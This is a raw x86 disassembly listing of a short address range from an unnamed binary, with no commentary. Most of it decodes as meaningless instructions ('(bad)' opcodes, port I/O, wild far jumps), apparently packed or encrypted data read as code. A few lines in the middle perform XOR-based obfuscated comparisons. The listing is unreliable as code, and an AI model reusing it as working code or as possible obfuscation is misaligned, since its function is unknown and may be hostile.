  4150c8:	out    0xa9,al
  4150ca:	(bad)  
  4150cc:	ins    BYTE PTR es:[edi],dx
  4150cd:	pop    es
  4150ce:	jg     0x4150ad
  4150d0:	push   cs
  4150d1:	mov    eax,0x178bc248
  4150d6:	dec    edi
  4150d7:	xor    DWORD PTR [esi+0x2be09e79],ebx
  4150dd:	arpl   WORD PTR [ebx],di
  4150df:	push   ebx
  4150e0:	fadd   st,st(2)
  4150e2:	push   ss
  4150e3:	fwait
  4150e4:	jnp    0x415146
  4150e6:	or     bl,BYTE PTR ds:0x66eeaf78
  4150ec:	js     0x4150f8
  4150ee:	add    ebx,DWORD PTR [ecx+eax*8+0x140dc27e]
  4150f5:	stos   DWORD PTR es:[edi],eax
  4150f6:	jbe    0x415170
  4150f8:	mov    ebp,0xfe6a5297
  4150fd:	and    al,0x28
  4150ff:	pushf  
  415100:	shr    edx,0x4b
  415103:	sbb    al,0xf
  415105:	in     eax,0x4f
  415107:	fchs   
  415109:	mov    eax,0xcc19ca69
  41510e:	aas    
  41510f:	mov    edi,0x5fdd0f05
  415114:	adc    al,0xdb
  415116:	loopne 0x415157
  415118:	in     ax,dx
  41511a:	mov    edx,0x1c006e02
  41511f:	shl    DWORD PTR [edx],0xeb
  415122:	cwde   
  415123:	gs call 0x33802e34
  415129:	hlt    
  41512a:	std    
  41512b:	leave  
  41512c:	or     DWORD PTR [edi],ebx
  41512e:	out    0x1f,eax
  415130:	int    0x3
  415132:	push   edx
  415133:	hlt    
  415134:	jnp    0x4150c9
  415136:	imul   ecx,DWORD PTR ds:0xa4757ec6,0x14
  41513d:	push   ss
  41513e:	pushf  
  41513f:	inc    eax
  415140:	repnz les edi,FWORD PTR [esi-0x27f1f093]
  415147:	adc    ebx,DWORD PTR [ebx]
  415149:	fs mov dl,0x55
  41514c:	cmp    BYTE PTR [esi],dh
  41514e:	dec    esp
  41514f:	stos   BYTE PTR es:[edi],al
  415150:	dec    BYTE PTR [edx-0xa]
  415153:	nop
  415154:	test   al,0x4d
  415156:	mov    esi,DWORD PTR [edx]
  415158:	jo     0x41510c
  41515a:	fwait
  41515b:	std    
  41515c:	fwait
  41515d:	xcrypt-ecb (bad)
  41515e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41515f:	push   cs
  415160:	mul    DWORD PTR [edx-0x406db574]
  415166:	cmc    
  415167:	and    BYTE PTR [ebx-0x6f55a204],ah
  41516d:	sub    dh,BYTE PTR [eax+0x38]
  415170:	ret    0x8b38
  415173:	rol    BYTE PTR [esi+0x18],0x46
  415177:	addr16 dec ebx
  415179:	out    0xad,eax
  41517b:	xor    eax,0x2bbf51df
  415180:	loopne 0x41510b
  415182:	fmul   QWORD PTR gs:[ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fldenv [esi+ebp*2]
  4151a6:	jmp    0x7f473f51
  4151ab:	jo     0x415166
  4151ad:	jle    0x41521f
  4151af:	jo     0x4151f4
  4151b1:	lea    edi,[eax-0x6bb33333]
  4151b7:	adc    cl,BYTE PTR [edi+0x17afe58a]
  4151bd:	adc    cl,BYTE PTR [ecx+ebx*4]
  4151c0:	rcl    DWORD PTR [eax+0x5fe8ef78],1
  4151c6:	push   esp
  4151c7:	cmp    BYTE PTR [esi+eax*1+0x2c3170c4],ch
  4151ce:	dec    eax
  4151cf:	cmp    DWORD PTR [ebx+0x7ce8cb88],ebx
  4151d5:	(bad)  
  4151d6:	mov    esp,ebp
  4151d8:	mov    ds:0x7ecc293b,al
  4151dd:	mov    eax,ds:0x7b0a3977
  4151e2:	ins    BYTE PTR es:[edi],dx
  4151e3:	mov    bl,0x5
  4151e5:	cmp    ecx,esp
  4151e7:	add    eax,0xb606518e
  4151ec:	mov    ebp,0x9f3fca41
  4151f1:	aad    0x9
  4151f3:	adc    edi,edi
  4151f5:	pop    esi
  4151f6:	add    eax,0xef3d0667
  4151fb:	sub    eax,0xb0d71c77
  415200:	or     eax,0x9c64a5a4
  415205:	jb     0x415223
  415207:	aaa    
  415208:	mov    cl,0x2f
  41520a:	add    BYTE PTR [ecx],0xb3
  41520d:	push   0xf2ca038c
  415212:	aaa    
  415213:	fisttp QWORD PTR [edx-0x125a32c4]
  415219:	sbb    ecx,DWORD PTR [ecx-0x5d]
  41521c:	ins    DWORD PTR es:[edi],dx
  41521d:	add    ebx,DWORD PTR [ecx-0xa5cf1ca]
  415223:	int    0x71
  415225:	call   DWORD PTR [ebx+0x2a3f3052]
  41522b:	xor    bh,ah
  41522d:	jg     0x41526e
  41522f:	adc    edi,DWORD PTR [ecx+ebx*1-0x75]
  415233:	or     BYTE PTR [ebx+0x70],dl
  415236:	sbb    ch,bh
  415238:	jl     0x415278
  41523a:	pusha  
  41523b:	neg    DWORD PTR [edi-0x1]
  41523e:	jno    0x415287
  415240:	push   edi
  415241:	imul   ebx,DWORD PTR [ebx],0x3ceef49a
  415247:	call   0x8d75:0x9e160a6e
  41524e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41524f:	inc    esp
  415250:	or     bl,bl
  415252:	repnz in al,dx
  415254:	push   edi
  415255:	bnd jmp 0x415244
  415258:	dec    ecx
  415259:	add    edi,esi
  41525b:	mov    ebx,0xef83d0d4
  415261:	je     0x415285
  415263:	inc    esp
  415264:	sbb    BYTE PTR [edx+eiz*2],bh
  415267:	mov    al,0x8a
  415269:	jo     0x41526d
  41526b:	xchg   edx,eax
  41526c:	sahf   
  41526d:	mov    ebx,0xa0789099
  415272:	outs   dx,DWORD PTR ds:[esi]
  415273:	push   0x74e4aed5
  415278:	push   ebx
  415279:	lods   eax,DWORD PTR ds:[esi]
  41527a:	inc    ecx
  41527b:	pusha  
  41527c:	fs inc ecx
  41527e:	or     edi,eax
  415280:	pop    es
  415281:	sub    BYTE PTR [edx],ah
  415283:	test   BYTE PTR [esi+0xc],0x88
  415287:	push   es
  415288:	add    DWORD PTR [ebx+0x4d],ebp
  41528b:	or     eax,DWORD PTR [edi+eiz*2]
  41528e:	arpl   WORD PTR [eax+0x7f2536e4],bx
  415294:	xchg   DWORD PTR [ebx],esp
  415296:	push   0xb51744f1
  41529b:	sbb    esp,DWORD PTR [edi]
  41529d:	call   0xa1d11d17
  4152a2:	rol    BYTE PTR [ebp+0x3d],0x8d
  4152a6:	ret    0x60cb
  4152a9:	add    BYTE PTR [eax],dh
  4152ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152ac:	and    dl,bh
  4152ae:	xchg   ecx,eax
  4152af:	push   cs
  4152b0:	mov    ch,0x7a
  4152b2:	xchg   BYTE PTR [edi],cl
  4152b4:	fidivr DWORD PTR [edi]
  4152b6:	sti    
  4152b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152b8:	pop    esp
  4152b9:	or     BYTE PTR [ecx-0x43],ch
  4152bc:	(bad)  
  4152bd:	or     ah,dh
  4152bf:	push   esi
  4152c0:	in     al,0xca
  4152c2:	ret    0xba3f
  4152c5:	sbb    esi,DWORD PTR [edi]
  4152c7:	and    edi,DWORD PTR [edi]
  4152c9:	jp     0x4152d8
  4152cb:	mov    ah,0x3a
  4152cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152ce:	scas   al,BYTE PTR es:[edi]
  4152cf:	pop    ebp
  4152d0:	imul   ebp,DWORD PTR [esi],0x500394d4
  4152d6:	fs jne 0x4152a8
  4152d9:	cmp    ah,BYTE PTR [esi+0x269b3408]
  4152df:	mov    ch,BYTE PTR [edx+0x6a]
  4152e2:	js     0x4152ec
  4152e4:	xor    BYTE PTR [edx+0x59],bh
  4152e7:	fwait
  4152e8:	cmp    dl,ah
  4152ea:	nop
  4152eb:	cmp    bl,BYTE PTR [edi]
  4152ed:	lods   eax,DWORD PTR ds:[esi]
  4152ee:	jno    0x41527d
  4152f0:	sub    al,0x12
  4152f2:	cs pushf 
  4152f4:	pop    esi
  4152f5:	sub    DWORD PTR ds:0x4942160a,0xc69af991
  4152ff:	hlt    
  415300:	jne    0x415374
  415302:	xor    eax,0x26e6a3fb
  415307:	push   ds
  415308:	dec    ebx
  415309:	loope  0x415368
  41530b:	in     al,dx
  41530c:	and    bh,ch
  41530e:	jae    0x4152b2
  415310:	and    al,BYTE PTR [ecx]
  415312:	daa    
  415313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415314:	int    0x89
  415316:	scas   al,BYTE PTR es:[edi]
  415317:	cmc    
  415318:	or     DWORD PTR ss:[eax-0x5d],edx
  41531c:	and    al,0xea
  41531e:	repnz (bad)
  415321:	push   ss
  415322:	nop
  415323:	jns    0x41536b
  415325:	add    al,0xcb
  415327:	(bad)  
  415328:	mov    eax,ds:0xa047771e
  41532d:	sbb    dh,bh
  41532f:	inc    edi
  415330:	xchg   edx,eax
  415331:	jp     0x41530b
  415333:	fiadd  WORD PTR [ecx+0x1d719d37]
  415339:	add    al,0x3c
  41533b:	inc    edx
  41533c:	xchg   ebp,eax
  41533d:	mov    esp,0x7f770e2b
  415342:	mov    esi,0x8a2dc2dd
  415347:	les    esi,FWORD PTR [esi+ebx*2-0x2a]
  41534b:	or     DWORD PTR [ecx-0x19972d0a],ebp
  415351:	pop    edi
  415352:	in     eax,0x27
  415354:	cmp    eax,esp
  415356:	mov    ebx,0x9d670f16
  41535b:	adc    BYTE PTR [edx+0x4591aeaa],dl
  415361:	fs cmp eax,0x9cd331d
  415367:	xlat   BYTE PTR ds:[ebx]
  415368:	and    BYTE PTR [ebx-0x33],dl
  41536b:	mov    BYTE PTR [edi],dl
  41536d:	or     al,0x6a
  41536f:	sbb    cl,cl
  415371:	int    0x4
  415373:	test   BYTE PTR [esi-0x7d852e39],0x5d
  41537a:	(bad)
  41537e:	pop    es
  41537f:	jo     0x41539e
  415381:	imul   esp,DWORD PTR [ecx],0x7f379d9b
  415387:	ins    BYTE PTR es:[edi],dx
  415388:	daa    
  415389:	popf   
  41538a:	jns    0x4153be
  41538c:	dec    ebp
  41538d:	frstor [edi+0x6a2ee00f]
  415393:	loopne 0x415326
  415395:	rcl    ebp,0x35
  415398:	leave  
  415399:	icebp  
  41539a:	ret    
  41539b:	imul   BYTE PTR [ecx-0x4e]
  41539e:	(bad)  
  41539f:	aam    0x25
  4153a1:	push   es
  4153a2:	lods   al,BYTE PTR ds:[esi]
  4153a3:	nop
  4153a4:	pop    esi
  4153a5:	daa    
  4153a6:	push   cs
  4153a7:	cs push edx
  4153a9:	xor    DWORD PTR [esi-0x5a62b236],esi
  4153af:	and    ch,BYTE PTR [eax]
  4153b1:	stc    
  4153b2:	sub    BYTE PTR [edi+0x73371ca],ah
  4153b8:	xchg   edi,eax
  4153b9:	hlt    
  4153ba:	ret    
  4153bb:	retf   0x40a7
  4153be:	or     DWORD PTR [esi+0x3c4abf83],esp
  4153c4:	or     eax,DWORD PTR [edi]
  4153c6:	imul   ecx,DWORD PTR [esi-0x1b],0xeafb74c0
  4153cd:	adc    BYTE PTR [eax],al
  4153cf:	inc    ecx
  4153d0:	inc    esp
  4153d1:	jne    0x4153c9
  4153d3:	push   ebp
  4153d4:	stc    
  4153d5:	mov    ch,0x7d
  4153d7:	jo     0x41538c
  4153d9:	imul   esi,DWORD PTR [eax],0xf08bec42
  4153df:	push   eax
  4153e0:	fs jp  0x4153b4
  4153e3:	push   ebx
  4153e4:	lods   al,BYTE PTR ds:[esi]
  4153e5:	mov    al,0x9e
  4153e7:	or     BYTE PTR [eax],0x2d
  4153ea:	lock jge 0x415374
  4153ed:	or     DWORD PTR [eax-0x6cebe93e],0xc732f34e
  4153f7:	inc    ebp
  4153f8:	inc    esp
  4153f9:	test   DWORD PTR [edx+eax*1-0x30],0xaf1d27b5
  415401:	xrelease mov BYTE PTR [esi+eax*8],bl
  415405:	retf   
  415406:	dec    edx
  415407:	ret    
  415408:	adc    eax,0xc77c3599
  41540d:	jmp    0x943b85bc
  415412:	ins    BYTE PTR es:[edi],dx
  415413:	imul   edi,ecx,0xc60eeac8
  415419:	arpl   WORD PTR [edi-0x6c],dx
  41541c:	je     0x4153b5
  41541e:	jnp    0x415436
  415420:	and    al,0xcb
  415422:	cwde   
  415423:	dec    esp
  415424:	scas   eax,DWORD PTR es:[edi]
  415425:	push   edi
  415426:	cmp    BYTE PTR [esi+ecx*1],0xbe
  41542a:	dec    ebp
  41542b:	jecxz  0x415433
  41542d:	outs   dx,DWORD PTR ds:[esi]
  41542e:	and    al,0xbe
  415430:	(bad)  
  415431:	lahf   
  415432:	xor    DWORD PTR [edi],esp
  415434:	sub    DWORD PTR [edx],esp
  415436:	imul   ecx,DWORD PTR [edi-0x77ed24e9],0x4b
  41543d:	push   eax
  41543e:	cmp    BYTE PTR [eax],ah
  415440:	dec    esi
  415441:	loope  0x4154c0
  415443:	push   ebp
  415444:	pop    edi
  415445:	adc    ch,BYTE PTR [ebx+0x52dbe18e]
  41544b:	int3   
  41544c:	stos   DWORD PTR es:[edi],eax
  41544d:	inc    esi
  41544e:	(bad)  
  41544f:	shl    BYTE PTR [eax*2+0x2ff24a3b],cl
  415456:	lahf   
  415457:	shl    DWORD PTR [eax+0x9b7b13],1
  41545d:	fild   WORD PTR [eax+0x15]
  415460:	xchg   ebx,eax
  415461:	int    0xb1
  415463:	pop    edi
  415464:	mov    ?,WORD PTR [ecx-0x6]
  415467:	jg     0x415493
  415469:	(bad)  
  41546a:	pop    edx
  41546b:	adc    DWORD PTR [eax],ebp
  41546d:	xor    ah,cl
  41546f:	xchg   esp,eax
  415470:	xchg   ebp,eax
  415471:	push   ecx
  415472:	sbb    eax,0xc06894f7
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xd
  4154c8:	lock hlt 
  4154ca:	loop   0x415502
  4154cc:	add    bh,BYTE PTR [edi+0x70]
  4154cf:	mov    ecx,0x6c70707e
  4154d4:	mov    ds:0x56462262,eax
  4154d9:	icebp  
  4154da:	shl    BYTE PTR [esi-0x47],cl
  4154dd:	outs   dx,BYTE PTR ds:[esi]
  4154de:	ins    DWORD PTR es:[edi],dx
  4154df:	enter  0xd4e8,0x90
  4154e3:	jp     0x415526
  4154e5:	test   BYTE PTR [ecx],dl
  4154e7:	pop    ecx
  4154e8:	daa    
  4154e9:	stc    
  4154ea:	mov    eax,ds:0x204fc563
  4154ef:	sbb    esi,DWORD PTR [ebx-0x22]
  4154f2:	mov    DWORD PTR [ebx-0x73],esp
  4154f5:	adc    al,0xcc
  4154f7:	push   0x15
  4154f9:	retf   
  4154fa:	cmp    eax,0x4615c84e
  4154ff:	jl     0x4154a6
  415501:	bound  ebp,QWORD PTR [edi-0x7e58f03e]
  415507:	shl    BYTE PTR [ebx+ebp*1+0x69],cl
  41550b:	or     eax,esp
  41550d:	sub    BYTE PTR [edx],bl
  41550f:	icebp  
  415510:	popf   
  415511:	xchg   ebx,eax
  415512:	fiadd  DWORD PTR [ebp+0x21]
  415515:	jmp    0x8b59:0xa5581177
  41551c:	xor    BYTE PTR cs:[edx],al
  41551f:	aas    
  415520:	xlat   BYTE PTR ds:[ebx]
  415521:	lods   eax,DWORD PTR ds:[esi]
  415522:	add    eax,0x1eff382c
  415527:	shl    BYTE PTR [eax],1
  415529:	dec    BYTE PTR [eax]
  41552b:	pop    ss
  41552c:	inc    ecx
  41552d:	pusha  
  41552e:	cmp    eax,esi
  415530:	in     al,dx
  415531:	les    edi,FWORD PTR [edx+0x28]
  415534:	or     eax,0x7bc648d6
  415539:	mov    cl,0x15
  41553b:	retf   
  41553c:	imul   edx,DWORD PTR [ebp+0x6a],0xa
  415540:	cmp    eax,0xf538835c
  415545:	mov    DWORD PTR [ebx],edi
  415547:	test   al,0x44
  415549:	sti    
  41554a:	clc    
  41554b:	sar    dh,0x58
  41554e:	xchg   DWORD PTR [ebx],ebx
  415550:	out    dx,eax
  415551:	cmp    esi,edx
  415553:	add    BYTE PTR [ebx-0x40],ah
  415556:	mov    esp,0xe351adb0
  41555b:	in     al,0x85
  41555d:	add    bh,BYTE PTR [edx-0x37]
  415560:	js     0x415543
  415562:	jmp    0x415551
  415564:	mov    ch,0x39
  415567:	(bad)  
  415568:	cdq    
  415569:	js     0x4155c2
  41556b:	ins    DWORD PTR es:[edi],dx
  41556c:	mov    eax,0x3b4ec67d
  415571:	mov    al,0x8d
  415573:	xchg   ecx,eax
  415574:	ds (bad) 
  415576:	xor    BYTE PTR [edx+0x3eae2337],al
  41557c:	xor    al,0x6c
  41557e:	jb     0x415509
  415580:	popa   
  415581:	adc    eax,0x657dd4d8
  415586:	adc    edx,edx
  415588:	or     al,BYTE PTR ds:0xadd22e53
  41558e:	inc    esi
  41558f:	push   ss
  415590:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415591:	pop    eax
  415592:	mov    bh,0x1b
  415594:	dec    esi
  415595:	mov    ecx,0x56e0112
  41559a:	pop    ebx
  41559b:	pop    esp
  41559c:	dec    edi
  41559d:	or     DWORD PTR ds:[edi+edi*8-0x19],eax
  4155a2:	mov    BYTE PTR ds:0x38ebac89,cl
  4155a8:	fisub  DWORD PTR [ecx-0x5]
  4155ab:	jae    0x41560b
  4155ad:	rcr    DWORD PTR [esi+0x7d7c6145],cl
  4155b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155b4:	scas   al,BYTE PTR es:[edi]
  4155b5:	xacquire xchg BYTE PTR [ebp+0x655b1a8a],al
  4155bc:	xor    ebp,0xffffff9a
  4155bf:	inc    ebx
  4155c0:	inc    BYTE PTR [eax-0x1f]
  4155c3:	icebp  
  4155c4:	stc    
  4155c5:	lahf   
  4155c6:	ror    DWORD PTR [edi-0x75],0x18
  4155ca:	es push edi
  4155cc:	cmp    eax,0xee812b99
  4155d1:	add    dh,BYTE PTR [edi-0x56c58f87]
  4155d7:	and    dl,BYTE PTR [ebx-0x5bf815f6]
  4155dd:	ds (bad) 
  4155df:	fidivr WORD PTR [ecx]
  4155e1:	pop    ebp
  4155e2:	xchg   esi,eax
  4155e3:	test   al,0x83
  4155e5:	fisttp WORD PTR [eax]
  4155e7:	fwait
  4155e8:	jmp    0x4c04fadf
  4155ed:	pop    ecx
  4155ee:	xchg   ecx,eax
  4155ef:	xchg   esp,eax
  4155f0:	add    eax,ecx
  4155f2:	rcr    DWORD PTR [edx],1
  4155f4:	stc    
  4155f5:	push   es
  4155f6:	mov    esp,?
  4155f8:	mov    bl,0x5
  4155fa:	or     dh,bh
  4155fc:	mov    WORD PTR [ecx],cs
  4155fe:	and    cl,dh
  415600:	adc    eax,0x3f3d1e9f
  415605:	std    
  415606:	out    0x83,eax
  415608:	adc    DWORD PTR [edi+0x48],esi
  41560b:	sahf   
  41560c:	xchg   esi,eax
  41560d:	or     ecx,ebx
  41560f:	outs   dx,DWORD PTR ds:[esi]
  415610:	iret   
  415611:	adc    cl,dh
  415613:	sub    ah,dh
  415615:	test   BYTE PTR [ebp-0x15],al
  415618:	cs std 
  41561a:	clc    
  41561b:	jp     0x41567a
  41561d:	sub    eax,0x3a157014
  415622:	push   edi
  415623:	ins    DWORD PTR es:[edi],dx
  415624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415625:	add    BYTE PTR [edx],cl
  415627:	xor    BYTE PTR [edx],bl
  415629:	push   cs
  41562a:	xor    DWORD PTR [edx],ebp
  41562c:	adc    edi,DWORD PTR [eax]
  41562e:	jecxz  0x4155c7
  415630:	push   eax
  415631:	ss stos DWORD PTR es:[edi],eax
  415633:	lahf   
  415634:	xchg   DWORD PTR [eax],ecx
  415636:	mov    al,dl
  415638:	fbld   TBYTE PTR [ebx+0xa86e2fb]
  41563e:	adc    eax,DWORD PTR [ebp-0x7]
  415641:	sbb    edi,DWORD PTR [edx+0x17c7f22d]
  415647:	loop   0x415652
  415649:	or     al,0xc1
  41564b:	cwde   
  41564c:	xchg   BYTE PTR [ebp+ecx*2+0x2e],bh
  415650:	dec    edi
  415651:	nop    DWORD PTR [ebx]
  415654:	mov    edx,0x97302c3a
  415659:	jecxz  0x4156a2
  41565b:	in     eax,dx
  41565c:	je     0x415652
  41565e:	mov    ecx,0xf5420b1d
  415663:	shl    BYTE PTR [ecx-0x8],1
  415666:	es jp  0x415621
  415669:	stos   BYTE PTR es:[edi],al
  41566a:	out    dx,al
  41566b:	seta   BYTE PTR [ebx+0x13cc44a0]
  415672:	mov    edi,0xa87a6317
  415677:	in     al,0x7
  415679:	ins    DWORD PTR es:[edi],dx
  41567a:	jmp    0x4156bb
  41567c:	ret    0xe4e3
  41567f:	out    0x5e,eax
  415681:	int3   
  415682:	ret    
  415683:	fisubr WORD PTR [edi-0x4287c398]
  415689:	in     al,0x79
  41568b:	ss push 0x61
  41568e:	pop    edi
  41568f:	xchg   edi,eax
  415690:	aam    0x97
  415692:	and    al,0x32
  415694:	fcmovnb st,st(6)
  415696:	xor    DWORD PTR [eax-0x54437daa],0x188fee85
  4156a0:	std    
  4156a1:	dec    esi
  4156a2:	daa    
  4156a3:	pop    eax
  4156a4:	pop    edi
  4156a5:	aaa    
  4156a6:	push   0xffffffc9
  4156a8:	add    dh,BYTE PTR [ebx]
  4156aa:	stos   DWORD PTR es:[edi],eax
  4156ab:	xor    ch,BYTE PTR [edi+0x2d3f17e3]
  4156b1:	and    DWORD PTR [edi+0x5b],edi
  4156b4:	cs xchg esp,eax
  4156b6:	test   BYTE PTR [ebx-0x76729903],bl
  4156bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156bd:	jmp    0x39ac9482
  4156c2:	rcr    DWORD PTR [edi-0x4f616ae3],cl
  4156c8:	outs   dx,BYTE PTR ds:[esi]
  4156c9:	fwait
  4156ca:	xchg   esp,eax
  4156cb:	inc    edi
  4156cc:	pop    edx
  4156cd:	jae    0x41566d
  4156cf:	es jl  0x4156d7
  4156d2:	mov    esp,0x8c663c5
  4156d7:	loopne 0x4156e3
  4156d9:	pop    esp
  4156da:	xchg   edi,eax
  4156db:	pop    ss
  4156dc:	std    
  4156dd:	icebp  
  4156de:	or     dl,bh
  4156e0:	add    edx,DWORD PTR [esi]
  4156e2:	pop    esi
  4156e3:	xchg   edi,eax
  4156e4:	jmp    0x41566a
  4156e6:	(bad)  
  4156e7:	jmp    0x1357dd3b
  4156ec:	pop    esp
  4156ed:	outs   dx,DWORD PTR ds:[esi]
  4156ee:	adc    al,0x1
  4156f0:	or     al,0xa1
  4156f2:	mov    dh,0xb3
  4156f4:	mov    ecx,edi
  4156f6:	pop    ss
  4156f7:	das    
  4156f8:	fs jmp 0x2a0db0ec
  4156fe:	xchg   edx,eax
  4156ff:	push   edx
  415700:	and    eax,0xb22fc545
  415705:	sbb    ebx,edi
  415707:	jns    0x4156e9
  415709:	out    dx,al
  41570a:	adc    DWORD PTR [edi-0x150bb682],esp
  415710:	xlat   BYTE PTR ds:[ebx]
  415711:	mov    al,0x5f
  415713:	fs mov ebx,cs
  415716:	test   BYTE PTR [ebx+eax*8],0x6b
  41571a:	ss scas al,BYTE PTR es:[edi]
  41571c:	or     esi,DWORD PTR [edi+0x48bd8d00]
  415722:	retf   
  415723:	fadd   DWORD PTR [ecx+0x29]
  415726:	dec    ebx
  415727:	ret    0xc3a0
  41572a:	loop   0x41577c
  41572c:	push   es
  41572d:	pop    ds
  41572e:	imul   esi,eax,0xd2e30a34
  415734:	shl    DWORD PTR [edi],cl
  415736:	scas   eax,DWORD PTR es:[edi]
  415737:	std    
  415738:	fistp  QWORD PTR [ebx-0xe]
  41573b:	xchg   DWORD PTR [esi],ebp
  41573d:	test   esi,ebp
  41573f:	mov    eax,ds:0x28e92073
  415744:	mov    al,0x93
  415746:	sbb    bh,0x53
  415749:	xor    BYTE PTR [ebp+0x4d6a05f4],dl
  41574f:	pop    ebp
  415750:	mov    ah,0xcf
  415752:	ret    
  415753:	ror    BYTE PTR [esi],0x13
  415756:	imul   edx,edx,0xffffffb0
  415759:	pop    ecx
  41575a:	into   
  41575b:	sbb    al,0xfb
  41575d:	xchg   esi,eax
  41575e:	out    0x51,eax
  415760:	arpl   WORD PTR [ecx+0x2e],dx
  415763:	sbb    ebp,DWORD PTR [edx]
  415765:	pop    es
  415766:	pushf  
  415767:	adc    edi,0xc3a55d5a
  41576d:	(bad)  
  41576e:	in     al,dx
  41576f:	mov    cl,0xe9
  415771:	sub    ebp,ecx
  415773:	add    dh,BYTE PTR [eax-0x614fb0d5]
  415779:	push   ss
  41577a:	fs (bad) 
  41577c:	imul   ebx,DWORD PTR [esi+ebp*1-0x12c25ad2],0xdc8c0d10
  415787:	in     eax,0x52
  415789:	add    eax,0x86e40fc3
  41578e:	dec    ebx
  41578f:	daa    
  415790:	imul   esp,DWORD PTR [esi+eax*2],0x38
  415794:	inc    ecx
  415795:	jmp    0x9cbe:0x7412545f
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [ecx+0x7ff83538],al
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x415779
  4157c4:	pop    ecx
  4157c5:	pop    esi
  4157c6:	ss xchg edx,eax
  4157c8:	cmp    dl,BYTE PTR ds:0xe2bc7b4c
  4157ce:	pop    ecx
  4157cf:	or     bh,BYTE PTR [ebx-0x1c]
  4157d2:	push   ecx
  4157d3:	inc    edi
  4157d4:	test   DWORD PTR [edx+0x382be34a],ebp
  4157da:	and    BYTE PTR [ebp+0x7254b746],ah
  4157e0:	xor    BYTE PTR [edi+0x1e8dee20],cl
  4157e6:	das    
  4157e7:	pushf  
  4157e8:	mov    ds:0x507d3a79,eax
  4157ed:	jae    0x415817
  4157ef:	(bad)  
  4157f0:	neg    DWORD PTR [edi+ebx*4+0x26b3ec20]
  4157f7:	push   esi
  4157f8:	push   ecx
  4157f9:	add    al,0xa2
  4157fb:	and    eax,0x43aed21e
  415800:	sbb    ebx,DWORD PTR [edi]
  415802:	int3   
  415803:	iret   
  415804:	pop    ss
  415805:	lods   eax,DWORD PTR ds:[esi]
  415806:	mov    al,0x60
  415808:	mov    ds:0xe6bcf043,eax
  41580d:	fs pop ds
  41580f:	js     0x415794
  415811:	xlat   BYTE PTR ds:[ebx]
  415812:	test   al,0xb2
  415814:	cmp    DWORD PTR [ebp-0x163f248c],0x1e
  41581b:	or     DWORD PTR [edx+0x540e046],esi
  415821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415822:	fist   DWORD PTR [ebp-0x5e]
  415825:	clc    
  415826:	mov    al,ds:0x4a803eba
  41582b:	adc    edi,DWORD PTR [bp+si+0x5]
  41582f:	inc    edx
  415830:	lea    ebx,[ecx+0x62186cd0]
  415836:	js     0x41584b
  415838:	xchg   ebp,eax
  415839:	push   ebx
  41583a:	ret    
  41583b:	push   ecx
  41583c:	nop
  41583d:	push   ebx
  41583e:	clc    
  41583f:	jbe    0x4157ee
  415841:	cmp    esp,DWORD PTR [edx+0xa024445]
  415847:	and    bl,bl
  415849:	lock xor ecx,DWORD PTR [ebp+0x54]
  41584d:	das    
  41584e:	in     al,dx
  41584f:	jnp    0x415859
  415851:	mov    esp,0x6b10ab26
  415856:	gs cs in al,dx
  415859:	adc    al,0x4c
  41585b:	sub    eax,edx
  41585d:	push   ds
  41585e:	jmp    0xe5062e5e
  415863:	call   0x153c:0xc3588970
  41586a:	arpl   WORD PTR [eax],bx
  41586c:	mov    DWORD PTR cs:[ebx+0x66ab689c],0xa31191d1
  415877:	lea    ebp,[esi+0x726be76f]
  41587d:	mov    al,ds:0x21019e2c
  415882:	por    mm0,mm3
  415885:	adc    al,0x35
  415887:	push   esi
  415888:	pop    es
  415889:	mov    bh,0x4c
  41588b:	cdq    
  41588c:	pop    ecx
  41588d:	fcomp  DWORD PTR ds:0x1c2552ea
  415893:	pop    ds
  415894:	mov    WORD PTR [edx-0x7c],es
  415897:	ins    DWORD PTR es:[edi],dx
  415898:	out    0x9c,eax
  41589a:	std    
  41589b:	f2xm1  
  41589d:	inc    eax
  41589e:	inc    edx
  41589f:	inc    edi
  4158a0:	sub    esi,eax
  4158a2:	popa   
